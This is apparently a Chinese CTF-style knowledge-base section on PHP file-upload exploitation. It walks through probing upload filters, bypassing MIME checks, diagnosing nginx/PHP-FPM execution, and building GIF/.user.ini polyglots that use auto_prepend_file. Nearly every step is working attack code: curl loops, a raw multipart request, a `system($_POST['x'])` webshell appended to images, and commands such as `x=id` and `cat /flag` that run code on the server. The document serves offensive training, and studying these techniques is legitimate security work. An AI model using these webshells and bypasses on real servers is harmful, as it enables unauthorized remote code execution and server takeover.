## [g-upload] 文件上传——过滤测绘、执行诊断与配置型 Getshell 实战补充

> 本分片不重复原有三条，而是补齐实战中最耗时、最容易走弯路的四个环节：**先测绘过滤规则**、**MIME 校验绕过**、**上传成功但执行不了的诊断**、**图片马与配置文件的组合拳**。

### [upload-filter-probe] 上传过滤测绘：先弄清查什么，再谈怎么绕 | medium | 文件上传;方法论;过滤探测 | filter probe;fuzz;先测绘
> 绕过一个不存在的限制是新手最大的时间黑洞——用三轮批量变体把「后缀 / MIME / 内容」三条校验轴分别测出来。

#### 这个条目的作用
绝大多数上传题卡住的原因不是"绕过技巧不够"，而是**根本没搞清楚服务端在校验什么**。凭感觉去试 `.phtml`、去构造图片马、去研究解析漏洞，可能整条路都是错的。这一条给你一套固定的三轮测绘流程：20 秒内确定校验轴，再决定绕过方案。**这是上传题的第一步，永远先做这件事。**

#### 前置条件
- 一个能返回明确成功/失败信息的接口（很多靶机会回显"文件存储在: xxx"，那是金矿）
- 能批量发请求（curl 循环或 Burp Intruder 都行）
- **强烈建议**：会用手工构造 multipart 的方式发请求（见第 4 步，curl 在某些字符上会骗你）

#### 第 1 步：先看回显，回显就是情报
操作：传一个最普通的合法文件，把**响应原文一字不差**地读一遍。
```bash
curl -s -i -F "file=@test.gif;type=image/gif" http://t/upload.php
```
- 预期结果：回显里经常直接给出存储路径、是否改名、保留不保留后缀。例如 `文件存储在: uploads/test.gif` 同时告诉你三件事——**目录名是 `uploads/`**、**没改名**、**后缀保留了**。
- 如果不行：什么都不回显也要记下 HTTP 状态码和响应长度，长度差异本身就是信号。
- 关键判断：**目录名一定要照着回显抄**。实战中 `upload` 与 `uploads` 混用极其常见，拼错目录会让你后面所有请求都打在空气上，却表现为"目标有防护"。

#### 第 2 步：第一轮——后缀轴（一次跑 8~10 个变体）
操作：内容固定不动（用一个合法 GIF），只改**发送的文件名**，看哪些被拒。
```bash
for n in a.php a.php.gif a.gif.php a.gif.txt a.GIF a.pHp a.gif. a.gifimage; do
  echo -n "$n => "
  curl -s -F "file=@test.gif;filename=$n;type=image/gif" http://t/upload.php
  echo
done
```
- 预期结果：拿到一张"放行/拒绝"对照表。
- 判读方法：**只有被拒的那个才是线索**。
  - 若 `a.gif.php` 与 `a.php` 都拒、`a.php.gif` 放行 → 校验**最后一个扩展名**，考虑尾随字符或配置文件绕。
  - 若几乎全放行、只有个别拒 → 校验的**根本不是后缀**，立刻转第 3 步。
  - 若全拒 → 白名单，转 `upload-content`（图片马）。
- 如果不行：把 `filename` 换成 `type` 再跑一轮（下一轮就是干这个）。

#### 第 3 步：第二轮——MIME 轴（每个变体只改 `type=`）
操作：文件名固定为 `probe.gif`，只改声明的 MIME。
```bash
for t in image/gif image/png image/jpeg application/octet-stream text/plain application/x-php; do
  echo -n "$t => "
  curl -s -F "file=@test.gif;filename=probe.gif;type=$t" http://t/upload.php
  echo
done
```
- 预期结果：常见结果有三种，判读完全不同：
  - **只认 `image/gif`**（连 `image/png` 都拒）→ 严格等值判断，见 `upload-mime-bypass`，直接声明 `type=image/gif` 即可拿下。
  - **认所有 `image/*`** → 同样声明一个图片 MIME 就行。
  - **全放行** → MIME 不参与校验，回第 2 步继续找真正的校验轴。

#### 第 4 步：第三轮——内容轴，以及"别信工具"铁律
操作：文件名和 MIME 都固定为能放行的值，只改**文件内容**。
```bash
# 只有 GIF89a 六个字节（太短，getimagesize 认不出尺寸）
printf 'GIF89a' > bare.gif
# 43 字节合法 1x1 GIF
printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b' > mini.gif
# 纯 PHP，无任何图片特征
echo '<?php echo 1;?>' > pure.php
for f in bare.gif mini.gif pure.php; do
  echo -n "$f => "
  curl -s -F "file=@$f;filename=p.gif;type=image/gif" http://t/upload.php
  echo
done
```
- 预期结果：`bare.gif` 与 `pure.php` 被拒、`mini.gif` 放行 → **服务端真的在读文件内容**（典型是 `getimagesize()`）。这说明要上图片马，转 `upload-content` / `upload-image-shell-pit`。
- 如果不行：三个都放行 → **内容完全不检查**，别浪费时间去构造合法图片头，直接把纯 PHP 文件传上去。

> [!danger]
> **不要相信命令行工具替你做的决定。** 两个真实踩过的坑：
> 1. `curl -F "file=@x;filename=shell.php "`（结尾带空格）——**curl 会把尾空格剥掉再发出**，所以服务端永远收不到你想要的畸形名。用 curl 永远测不出"尾随字符绕过"。
> 2. `curl -F "file=@x;filename=y.txt"` 不写 `;type=` 时，**curl 会拿 `filename` 去猜 MIME**：`.txt`→`text/plain`、`.png`→`image/png`、而 `.php` 它不认识 → 退成 `application/octet-stream`。于是"改文件名"这个动作**同时偷偷改了 MIME**，你以为是单变量实验，其实是双变量。
>
> 破解办法只有一个：**用 `--trace-ascii -` 或带外工具看一眼真正发出去的字节**。

#### 第 5 步：需要精确控制字节时，手工构造 multipart
操作：凡是涉及空格、制表符、NUL、控制字符、超长文件名，一律别用 `-F`，直接拼原始请求体。
```
POST /upload.php HTTP/1.1
Host: t
Content-Type: multipart/form-data; boundary=----wb123

------wb123
Content-Disposition: form-data; name="file"; filename="shell.php "
Content-Type: image/gif
<空行>
<文件内容原样>
------wb123--
```
- 预期结果：服务端收到的文件名与你写的**完全一致**，包括尾部空格。
- 如果不行：用 Burp Repeater 打开 `\r\n` 显示逐字节改也行；Python `requests` 的 `files={'file': ('shell.php ', data, 'image/gif')}` 同样能保留空格。

#### 第 6 步：把结论落成一行备忘
操作：测绘完立刻写下来，别靠记忆。
```txt
后端: nginx / PHP 7.4.0
目录: uploads/（回显给出）
校验: ① 内容 getimagesize 必须通过 ② MIME 严格等于 image/gif ③ 文件名不以 .php 结尾
落地: 原名保存，不重命名
下一步: .user.ini（见 upload-userini-polyglot）或图片马
```
- 预期结果：这张备忘决定了后面所有工作的方向，也让你能一眼看出"哪条路根本没戏"。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 一轮变体全被拒就放弃 | 把"某个轴被拒"误当成"整条路不通" | 三条轴分别测；一个轴不通只说明要换绕过姿势 |
| 用 curl 测尾随字符结果全被拒 | curl 剥掉了尾空格/尾字符 | 手工构造 multipart 重测 |
| 明明改了文件名却像是改了类型 | curl 用 `filename` 猜了 MIME | 永远显式写 `;type=`，或用 `--trace-ascii` 核对 |
| 回显的路径拼错 | 没照抄回显 | 目录名严格以回显为准，`upload`/`uploads` 差别致命 |
| 觉得"没有校验"直接传 PHP 失败 | 内容轴没测 | 传 `pure.php` + 合法 GIF 各一次对比 |

#### 实战要点
- **先测绘，再绕过。** 花 30 秒做完三轮，能省掉几小时在错误方向上的爆破。
- **回显是最好的老师**：存储路径、是否改名、是否保留后缀，全在那一行里。
- **一次跑 8~10 个变体**，靠"对照组"找差异；只传一两个文件名什么也发现不了。
- **工具是黑盒**：`-F` 的 `filename` 会连带影响 MIME，尾字符会被剥离。涉及精确字节时一律手工构造。
- 把测绘结论写成一行备忘，避免自己在同一题上重复走弯路。

> [!tip] 上传题第一步永远是测绘：固定内容改文件名（测后缀轴）→ 固定文件名改 type（测 MIME 轴）→ 固定两者改内容（测内容轴）。三条轴测完，方案自然浮现。

> [!warn] `curl -F` 会剥掉 `filename=` 的尾空格，并会用 `filename` 猜出 `Content-Type`——这两点会让"实测"结果与真实请求不一致，凡涉及特殊字符必须用原始 multipart 或 Burp 复核。

### [upload-mime-bypass] MIME 校验绕过：Content-Type 是客户端说了算的 | easy | 文件上传;MIME;Content-Type | mime bypass;type 校验;客户端可控
> `$_FILES['file']['type']` 完全由客户端在请求里声明，服务端一个字节都没验证——最高性价比的上传洞。

#### 这个条目的作用
有些上传接口不查后缀、不查内容，只检查客户端声明的 MIME 类型（PHP 里就是 `$_FILES['file']['type']`）。这个值**是攻击者在 multipart 请求里自己写的一个字符串**，服务端拿来直接用，等于没校验。这一条教你识破它并一击拿下——从识别到利用通常只要一条命令。

#### 前置条件
- 已按 `upload-filter-probe` 完成测绘，确认"改 `type=` 能改变结果"
- 知道上传目录（回显给出）和文件名保存规则

#### 第 1 步：确认校验的是 MIME 而不是后缀
操作：同一个文件名，只改 `type=`，看结果是否相反。
```bash
# 同一个 .php 文件名，只换 MIME
curl -s -F "file=@shell.php;filename=u1.php;type=text/plain"    http://t/upload.php
curl -s -F "file=@shell.php;filename=u2.php;type=image/gif"      http://t/upload.php
```
- 预期结果：第一条被拒、第二条放行 → **决定权在 `type`，文件名根本不参与判断**。
- 如果不行：两条都被拒 → 还有别的轴在起作用（后缀或内容），回 `upload-filter-probe`。
- 关键判断：**"后缀换 MIME"和"MIME 换后缀"两个方向各做一次**。两个方向都指向 MIME，结论才闭合（单变量交叉验证）。

#### 第 2 步：摸清 MIME 白名单是"等值"还是"前缀"
操作：换一组 MIME 值，看接受范围。
```bash
for t in image/gif image/png image/jpeg image/webp application/octet-stream; do
  echo -n "$t => "
  curl -s -F "file=@test.gif;filename=p.gif;type=$t" http://t/upload.php
  echo
done
```
- 预期结果：两种可能——
  - **只认 `image/gif`**：说明是严格等值判断（`!== 'image/gif'`），照抄这个值就行，别选别的。
  - **认所有 `image/*`**：任选一个图片 MIME。
- 如果不行：`application/octet-stream` 也被接受 → 说明只拦 `text/plain` 之类的黑名单，同样有洞。

#### 第 3 步：直接利用
```bash
# 内容：<?php @system($_POST['x']); ?>
curl -s -F "file=@shell.php;filename=shell.php;type=image/gif" http://t/upload.php
curl -s -X POST -d 'x=id' http://t/uploads/shell.php
```
- 预期结果：文件名、内容都是纯粹的 PHP，服务端照单全收并作为 PHP 执行。
- 如果不行：上传成功但访问不执行 → 转 `upload-exec-diag` 定位是哪一层拦了。

> [!danger]
> **为什么用浏览器永远测不出这个洞。** 浏览器会把 `Content-Type` 按**文件后缀自动设置**：`.gif` 就发 `image/gif`，去掉 `.gif` 就变成别的。于是"改后缀"和"改 MIME"两个变量在你手里永远**锁死同步**，你只能观察到"必须传 .gif"这个假象。**只有用 curl 显式指定 `;type=`，才能把这两个变量拆开。** 这也解释了为什么很多人在浏览器里怎么试都不对。

#### 第 4 步：顺手掌握 curl 的 MIME 猜测规则（避免自己被自己骗）
操作：不写 `;type=` 时，curl 按下面三条优先级决定发什么：
| 优先级 | 依据 | 实测 |
| --- | --- | --- |
| ① | `filename=` 的扩展名，**前提是 curl 认识** | `x.gif`→`image/gif`；`x.txt`→`text/plain`；`x.png`→`image/png` |
| ② | 不认识 → 退回看**本地文件路径**的扩展名 | 本地 `test.gif` + `filename=x.zzz` → `image/gif` |
| ③ | 两个都不认识 → 默认值 | `.php` → `application/octet-stream` |
- 预期结果：你会明白「同一个命令，本地文件名不同，服务端看到的东西可以完全不同」。
- 关键判断：**`.php` 恰好不在 curl 的 MIME 表里**，所以 `-F "file=@shell.php"` 不写 type 时，服务端收到的是 `application/octet-stream`——严格白名单下必被拒。你以为在测后缀，其实在测 MIME。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 浏览器怎么试都"只能传 gif" | 浏览器按后缀自动设 MIME，两变量同步 | 换 curl 显式 `;type=` 复测 |
| 显式写了 type 仍被拒 | 还有后缀轴或内容轴在起作用 | 回 `upload-filter-probe` 重新测绘 |
| 声明了 image/gif 但服务端仍说是 octet-stream | 写法和位置不对（`;type=` 要在同一段） | 用 `--trace-ascii -` 核对实际发出的字节 |
| 上传成功但静态返回源码 | 后缀没被解析（nginx 只认 .php） | 转 `upload-exec-diag` 与 `upload-userini-polyglot` |

#### 实战要点
- **`$_FILES['file']['type']` 是请求里的普通字符串**，服务端读它就等于信任客户端。凡是只查 MIME 的上传点，等于不设防。
- 永远显式写 `;type=`，别让工具替你猜——这次你踩的坑本质是"工具做了决定而你不知道"。
- **两个方向各做一次实验**（换 MIME 固定名 / 换名固定 MIME），确认因果，别被单次观察误导。
- 严格等值判断（只认 `image/gif`）时，**照抄能过的那个值**，不要自作聪明换成 `image/png`。
- 这个洞在真实 SRC 里也很常见，价值通常定级不低（直接获取服务器权限）。

> [!tip] 判据口诀：同文件名换 MIME 结果相反 → MIME 是主导轴；声明 `image/gif` 就能传任意内容任意后缀 → 直接拿下。

> [!warn] 用 `-F` 时 `filename=` 会连带影响 curl 猜出的 `Content-Type`。做"单变量实验"前先 `--trace-ascii -` 确认变量真的只有一个。

### [upload-exec-diag] 上传成功却执行不了：四态诊断与 PHP-FPM 判读 | medium | 文件上传;执行诊断;PHP-FPM | Access denied;limit_extensions;File not found;405
> 上传回显成功 ≠ 能执行。看响应码和错误文案就能定位卡在哪一层，别再盲目换 payload。

#### 这个条目的作用
"文件传上去了，访问却不出结果"是上传题最常见的僵局。新手第一反应是换 payload、换后缀、再传一遍——但真正该做的是**判断拦截发生在哪一层**。这条给你一套四态诊断法，配合 `Access denied.` / `File not found.` 这两个几乎人人都会误读的文案，几分钟内定位问题。

#### 前置条件
- 已确认上传成功且知道真实路径（见 `upload-filter-probe` 第 1 步）
- 目标明确是 nginx + PHP-FPM（看响应头 `Server: nginx`、`X-Powered-By`）

#### 第 1 步：先做零成本的路由探测
操作：**不要**立刻传马。先用一个**根本不存在的 .php 文件**探路由，这一条信息量极大。
```bash
curl -s -o /dev/null -w "%{http_code}\n" http://t/uploads/nonexist123.php
curl -s http://t/uploads/nonexist123.php
```
- 预期结果：返回 `404` 且正文是 `File not found.` → 说明**请求确实进了 PHP-FPM**，只是文件不存在。
- 如果不行：返回一整个 nginx 的 HTML 404 页面 → 请求被 nginx 自己处理了，说明该路径的 `.php` 路由配置可能不同。

#### 第 2 步：记住这两个文案的天壤之别
| 文案 | 谁产生 | 含义 | 下一步 |
| --- | --- | --- | --- |
| `File not found.` | PHP-FPM | **根本没找到这个文件** | 路径/文件名错了，回查真实落盘名 |
| `Access denied.` | PHP-FPM | **文件找到了，但后缀不在 `security.limit_extensions` 白名单里** | 路径解析洞真实存在，只差后缀；想办法落地一个 `.php` |

> [!danger]
> 这两个词是**整套诊断里最关键的一对信号**。`Access denied.` 说明路径回溯已经成功定位到你的文件了（否则会报 `File not found.`），意味着 `cgi.fix_pathinfo` 那套路径解析机制确实存在——这是极有价值的情报，别因为"没执行成功"就忽略了它。

#### 第 3 步：四态判读表（按响应码分类）
```bash
curl -s -i -X POST -d 'x=id' http://t/uploads/你的文件
```
| 状态码 | 正文特征 | 卡在哪一层 | 对策 |
| --- | --- | --- | --- |
| **200** + 命令输出 | — | 无 | 成功 |
| **200** + 源码原文 | 看到 `<?php` | 被当**静态文件**返回 | 该后缀不被解析，见第 4 步 |
| **403** | `Access denied.` | PHP-FPM `limit_extensions` | 换 `.php` 落地方式（`upload-userini-polyglot`） |
| **404** | `File not found.` | 文件不存在 | 路径/名字错了 |
| **404** | nginx HTML 页 | nginx 静态未命中 | 后缀没进 FPM 路由 |
| **405 Not Allowed** | nginx HTML | **POST 打到了静态文件** | 该后缀 nginx 完全按静态处理，不是解析问题 |
| 其他（406/418/501） | 拦截页 | WAF | 转 `waf-basics` |

#### 第 4 步：确认后缀是否进入 PHP-FPM 路由
操作：用**不存在的文件**测后缀，避免被"文件不存在"干扰。
```bash
for e in php phtml php5 pht phar phps shtml; do
  echo -n ".$e => "
  curl -s -o /dev/null -w "%{http_code} " http://t/uploads/NOPE.$e
  curl -s http://t/uploads/NOPE.$e | head -c 20
  echo
done
```
- 预期结果：只有 `.php` 返回 `File not found.`，其余返回 nginx 自己的 404/405 → **nginx 只把 `.php` 交给 PHP-FPM**，`.phtml`/`.php5` 之类在这台机器上完全没戏。
- 如果不行：多个后缀都返回 `File not found.` → nginx 配置了多个 PHP 后缀，可选面更大。
- 关键判断：这一轮能**直接排除一整类无效方向**，别再浪费时间试 `.phtml`。

#### 第 5 步：确认 nginx 路由是否区分大小写
```bash
curl -s http://t/uploads/NOPE.PHP | head -c 20    # 大写
curl -s http://t/uploads/NOPE.pHp | head -c 20    # 混合
```
- 预期结果：返回 nginx 的 404 页 → `location ~ \.php$` 是**区分大小写**的，`.PHP` 不会被解析。
- 如果不行：返回 `File not found.` → 路由不区分大小写（`~*`），那么 `.PHP` 之类有利用空间。

#### 第 6 步：理解路径解析（path info）与它为什么常常白忙
操作：如果 `Access denied.` 出现了，说明可以试路径解析。
```bash
curl -s -X POST -d 'x=id' http://t/uploads/shell.gif/x.php    # 让 URL 以 .php 结尾
curl -s -X POST -d 'x=id' http://t/uploads/shell.gif/.php
```
- 预期结果：要么命中执行，要么返回 `Access denied.`。
- 判读：**`Access denied.` 说明 PHP-FPM 拿到了请求、成功把路径回溯到了 `shell.gif`，只是最后一步校验后缀失败**。这时真正的敌人是 `security.limit_extensions`，而不是路径解析。
- 如果不行：返回 `File not found.` → 该环境没开 `cgi.fix_pathinfo`，路径解析这条路直接放弃。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 把 `Access denied.` 当成"没找到文件" | 两文案混淆 | 记牢：Access denied = 找到了但后缀被拒 |
| 一上来就换 payload 重传 | 没定位层级 | 先跑第 1、4 步的路由探测，成本几乎为零 |
| 反复试 `.phtml`/`.php5` | 没确认 nginx 路由范围 | 用不存在文件测后缀，一次排除整类 |
| 405 当成"被拦截了" | 405 是 nginx 静态文件拒绝 POST | 说明该后缀根本没进 PHP，不是权限问题 |
| 路径解析试通了却仍 Access denied | 忽略 `limit_extensions` | 需要让磁盘上出现真·`.php` 文件，见 `upload-userini-polyglot` |

#### 实战要点
- **上传成功 ≠ 能执行**，两者之间还隔着"后缀路由 + FPM 白名单"两道门。
- **用不存在的文件探路由**是成本最低的诊断动作，一条命令就能确定后缀范围和大小写敏感性。
- 把 `Access denied.` 和 `File not found.` 刻进肌肉记忆，它们是 PHP-FPM 层最清晰的指路牌。
- **405 是 nginx 静态文件模块**的签名，看到它就说明请求压根没到 PHP。
- 诊断结论直接决定下一步：是修路径、换落地方式、还是整条路放弃。

> [!tip] 一条命令探路由：`curl -s http://t/uploads/NOPE.php | head -c 20`。返回 `File not found.` 说明后缀会进 PHP-FPM，返回 nginx HTML 说明不会。

> [!warn] `Access denied.` 不是失败信号而是**情报**：它证明路径解析机制存在，只差一个后缀合法的文件。据此选择 `.user.ini` 或其它落地手段，而不是放弃。

### [upload-userini-polyglot] .user.ini 实战：多语言文件与 300 秒缓存陷阱 | hard | 文件上传;.user.ini;auto_prepend | user.ini;cache_ttl;polyglot;多语言文件
> 当内容校验要求合法图片、文件名又禁止 `.php` 时，`.user.ini` 是标准答案——但它有两个足以劝退所有人的坑。

#### 这个条目的作用
这是"内容必须像图片"＋"文件名不能是 `.php`"＋"nginx 只执行 `.php`"三重封锁下的标准解法。原理在 `upload-config` 已经讲过，但**实际落地时有两个坑会让它看起来完全无效**：多语言文件构造、以及 PHP 的 `.user.ini` 缓存。两个坑我都真实踩过，这一条把它们讲透。

#### 前置条件
- 确认三点：内容校验（`getimagesize` 类）、文件名禁止 `.php`、目标为 nginx + PHP-FPM
- 上传目录里**存在至少一个真实可访问的 `.php` 文件**（否则预包含无从触发）——用 `curl http://t/uploads/` 看有没有默认页，有输出往往就是 `index.php`
- 能读到上传回显里的真实路径

#### 第 1 步：先找"触发器"，没有就别做
操作：访问上传目录本身和常见的 index。
```bash
curl -s -i http://t/uploads/
curl -s -i http://t/uploads/index.php
```
- 预期结果：返回 200 且有内容（例如 `nothing here`）→ **该目录下有真实的 `.php` 文件**，可以用作预包含触发器。
- 如果不行：返回 403/404 → 目录里没有 PHP 文件，`.user.ini` 配置了也触发不了，需要先想办法落地一个 `.php`，或改走图片马 + 文件包含。

#### 第 2 步：准备图片马（内容会被 auto_prepend 执行）
操作：这一步的产物是"被预包含的文件"，它必须同时是**合法 GIF**。
```bash
# 43 字节合法 1x1 GIF，且整段字节里不含 0x3c 0x3f（即不含 "<?"）
printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b' > mini.gif
cat >> mini.gif <<'EOF'
<?php @system($_POST['x']); ?>
EOF
curl -s -F "file=@mini.gif;filename=evil.gif;type=image/gif" http://t/upload.php
```
- 预期结果：上传成功，路径如 `uploads/evil.gif`。
- 如果不行：被内容校验拒 → 图片头不够完整，换一个更大的合法 GIF 再追加 PHP。
- 关键判断：**GIF 二进制里不能出现 `<?`**。真实图片的 XMP/EXIF 元数据里常含 `<?`（如 `<?xpacket begin=`），一旦它被当 PHP 解析就会报语法错误，详见 `upload-image-shell-pit`。

#### 第 3 步：构造 GIF / INI 多语言文件（本条的核心技巧）
操作：`.user.ini` 必须**同时**通过 `getimagesize()` 和 PHP 的 INI 解析器。诀窍是让第一行既是 GIF 头又是合法的 INI 键值对。
```bash
printf 'GIF89a = 1\nauto_prepend_file=/var/www/html/uploads/evil.gif\n' > .user.ini
```
逐字节解释：
- `GIF89a` 占 0~5 字节 —— 满足 `getimagesize` 的魔数要求
- 第 6~9 字节是 GIF 的宽高字段，这里填了 `" " "=" " " "1"`，`getimagesize` 会读出**垃圾尺寸但校验通过**
- 从 INI 解析器角度看，第一行是 `GIF89a = 1`（合法键值对），第二行是真正的指令
- 于是同一份文件，两个解析器各取所需

```bash
curl -s -F "file=@.user.ini;filename=.user.ini;type=image/gif" http://t/upload.php
curl -s http://t/uploads/.user.ini     # 回读确认内容一字不差
```
- 预期结果：上传成功且能回读到内容。
- 如果不行：被拒 → 说明内容校验更严（可能要求真实可解码的完整图片），改用完整的 43 字节 GIF 头 + 换行 + INI 指令再试。
- 关键判断：**`auto_prepend_file` 用绝对路径最稳**（相对路径相对于 `.user.ini` 所在目录，容易被改名的场景搞崩）。

#### 第 4 步：等待 —— 这是 90% 的人会卡死的地方
> [!danger]
> **PHP 把 `.user.ini` 的解析结果缓存在共享内存里，`user_ini.cache_ttl` 默认 300 秒。**
> 也就是说：**如果你在访问过该目录之后才上传 `.user.ini`，那么在最长 5 分钟内，所有 PHP 进程都仍在使用"这个目录没有 .user.ini"的旧缓存。**
> 表现就是：上传明明成功、内容明明正确、触发器也真实存在，但触发时**毫无反应**，看起来像 `.user.ini` 被禁用了。
>
> **对策：上传后等 5 分钟再触发，或者一开始就别提前访问上传目录去"侦察"。**
>
> 我本人就是在这里误判了——连打 15 次全是原样输出，于是断定 `.user.ini` 被禁用，转头去做了 67 种尾字符爆破、文件名绕过、路径解析，全是白费。过 TTL 后重试，一次就通。

#### 第 5 步：触发预包含
操作：访问同目录下那个真实存在的 `.php` 文件。
```bash
# 若第 1 步确认是 index.php
curl -s -X POST --data-urlencode "x=id" http://t/uploads/index.php
```
- 预期结果：输出里出现 `uid=...`（可能前面带一段图片二进制噪音，因为 GIF 字节在 `<?php` 之外会被原样输出，属正常）。
- 如果不行：参见第 4 步的缓存问题；再不行用第 6 步诊断是不是 INI 根本没被读。

#### 第 6 步：诊断 `.user.ini` 到底有没有被读取
操作：把它指向一个不存在的文件。若 PHP 真的读了它，`auto_prepend_file` 失败会抛致命错误。
```bash
printf 'GIF89a = 1\nauto_prepend_file=/tmp/NOPE_DIAG_12345\n' > .user.ini
curl -s -F "file=@.user.ini;filename=.user.ini;type=image/gif" http://t/upload.php
# 等过 TTL 后访问触发器
curl -s http://t/uploads/index.php
```
- 预期结果：出现 `Failed opening required` 之类致命错误 → **`.user.ini` 正常生效**，之前不通是别的原因。
- 如果不行：仍然原样输出 → 可能 `user_ini.filename` 被置空（加固）、或 INI 语法未被接受。注意：**INI 语法错误只会写进错误日志而不会回显**，所以"没报错"不等于"没被读取"，别据此下结论。

#### 第 7 步：拿到执行后的收尾
```bash
curl -s -X POST --data-urlencode "x=cat /flag" http://t/uploads/index.php
```
- 预期结果：直接读出 flag。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 上传成功、触发毫无反应 | **`user_ini.cache_ttl` 300 秒缓存** | 等 5 分钟再触发；别提前访问目录 |
| 判定为"`.user.ini` 被禁用" | 从上一条误推 | 过 TTL 重测；用第 6 步的不存在路径法诊断 |
| `.user.ini` 上传被内容校验拒 | 没有构造多语言文件 | 用 `GIF89a = 1` 开头让它同时是合法 GIF |
| 触发时输出一堆乱码 | 图片马在 `<?php` 之前有二进制字节 | 正常现象，用 `| tail` 或找关键字即可 |
| 预包含完全无效 | 该目录没有真实 `.php` 文件 | 先确认触发器存在，见第 1 步 |
| 改了内容却没变化 | 缓存仍是旧版本 | 同样等 TTL；TTL 内多次改写 `.user.ini` 都按第一次缓存算 |

#### 实战要点
- **`.user.ini` 是 nginx + PHP-FPM 环境下的 `.htaccess` 等价物**，`auto_prepend_file` 比 `.htaccess` 的 `AddType` 更稳（不改解析器，直接注入代码）。
- **多语言文件是关键技巧**：一份文件同时骗过图片检测和 INI 解析器，写法就是让 GIF 头的后四个字节恰好凑出一个合法的 `key = value`。
- **TTL 缓存是这道题最大的时间黑洞**：上传后不生效，先怀疑缓存，别急着推翻整个方案。
- 目录里必须有真实 `.php` 才能触发；`/uploads/` 有默认输出（如 "nothing here"）通常就是它在替你准备触发器。
- `.user.ini` 语法错误静默写日志，**不能靠"有没有报错"判断它是否被读取**。

> [!tip] 多语言文件一行公式：`GIF89a = 1` + 换行 + `auto_prepend_file=<绝对路径>`。前 6 字节喂 getimagesize，整行喂 INI 解析器。

> [!warn] 上传 `.user.ini` 后**必须等过 `user_ini.cache_ttl`（默认 300 秒）**才会生效。没生效先怀疑缓存，别误判为功能被禁用——这个误判会把你带向完全错误的方向。

### [upload-image-shell-pit] 图片马陷阱：二进制里的 `<?` 会让 PHP 语法崩溃 | medium | 文件上传;图片马;XMP | 图片马;Parse error;short_open_tag;XMP
> 真图片追加 PHP 代码后命名为 `.php`，PHP 会把整份二进制当源码解析——图片元数据里的 `<?` 会让它直接崩掉。

#### 这个条目的作用
"图片马"有两个完全不同的做法，用错了会撞上一个极难自查的坑：真图片尾部追加 PHP，配上 `.php` 后缀时，**PHP 会把整个二进制文件当源码解析**。而图片里天然存在的 `<?` 字节序列（XMP 元数据、EXIF）会让 PHP 提前进入代码模式，然后在二进制垃圾上报语法错误——**你的 payload 永远执行不到**。这一条教你识别并规避。

#### 前置条件
- 已确认需要图片马（内容校验存在），见 `upload-filter-probe` 第 4 步
- 已确认落地后能被当 PHP 执行（`.php` 后缀或预包含）

#### 第 1 步：认清两种"图片马"
| | 真图片 + 尾部追加 PHP | `GIF89a` 头 + 纯 PHP |
| --- | --- | --- |
| 结构 | `GIF89a…80万字节二进制…<?php …?>` | `GIF89a<?php …?>`（或合法小 GIF + PHP） |
| 用途 | 绕**内容校验**（`getimagesize`、魔数） | 绕**后缀校验** |
| 风险 | ⚠️ 二进制里的 `<?` 会让 PHP 语法崩溃 | ✅ 无二进制噪音 |
| 适用 | 需要同时是"能解码的真图" | 只需魔数能过校验 |
- 关键判断：内容校验**只要文件头**时，用右列（干净、安全）；只有校验要求"能真正解码出图像"时，才用左列。

#### 第 2 步：识别这个报错
```txt
Parse error: syntax error, unexpected 'begin' (T_STRING) in /var/www/html/uploads/shell.gif.php on line 1
```
- 预期结果：看到 `Parse error` 且报的是**一个你从没写过的单词**（`begin`、`xpacket` 之类）→ 100% 是二进制里的 `<?` 触发的。
- 关键判断：报错同时告诉你三件好事——
  1. **文件在执行**（上传 + 路由 + 后缀全通了）
  2. **报的是语法错误**（文件确实被当 PHP 源码解析了）
  3. **那个单词来自外部数据**（不是你写的，就是图片里的）

#### 第 3 步：定位罪魁祸首
操作：扫描文件里所有 `<?` 序列的位置和上下文。
```bash
# 统计各种开标签出现次数
node -e "
const fs=require('fs');
const b=fs.readFileSync('shell.gif.php');
const s=b.toString('latin1');
for(const p of ['<\\\\?php','<\\\\?=','<\\\\?']){
  const m=[...s.matchAll(new RegExp(p,'g'))];
  console.log(p, '出现', m.length, '次', m.length?('首个位置 '+m[0].index):'');
}
const i=s.indexOf('<?');
if(i>=0) console.log('上下文:', JSON.stringify(s.slice(Math.max(0,i-40), i+40)));
"
```
- 预期结果：典型输出——
  ```txt
  <\?php 出现 1 次 首个位置 874376     ← 你自己追加的那段
  <\?=   出现 3 次 首个位置 72790
  <\?    出现 533 次 首个位置 812
  上下文: "...XMP DataXMP<?xpacket begin=\"...\" id=\"W5M0Mp..."
  ```
- 判读：位置 812 处是 **XMP 元数据**里的 `<?xpacket begin=`，那是 Photoshop 存图时自动写入的。服务器 `short_open_tag=On`（或 `<?=` 默认开启），于是 PHP 在该处进入代码模式，把后面的 XML 当 PHP 解析，撞到 `begin` 就崩。

#### 第 4 步：构造干净的最小 GIF
操作：自己拼一个**字节可审计**的小 GIF，确保不含任何 `<?`。
```bash
# 43 字节合法 1x1 GIF
printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b' > clean.gif
# 验证：必须输出 0
node -e "const s=require('fs').readFileSync('clean.gif').toString('latin1');console.log('含 <? 次数:',(s.match(/<\?/g)||[]).length)"
# 追加 payload
printf '<?php @system($_POST["x"]); ?>' >> clean.gif
```
- 预期结果：`含 <? 次数: 0`，追加后总计 1 处 `<?`（就是你自己的 payload）。
- 如果不行：`getimagesize` 不认这个 43 字节 GIF → 用任意真实 1x1 GIF 替换，但**必须重新跑第 3 步的扫描确认二进制里没有 `<?`**。

> [!danger]
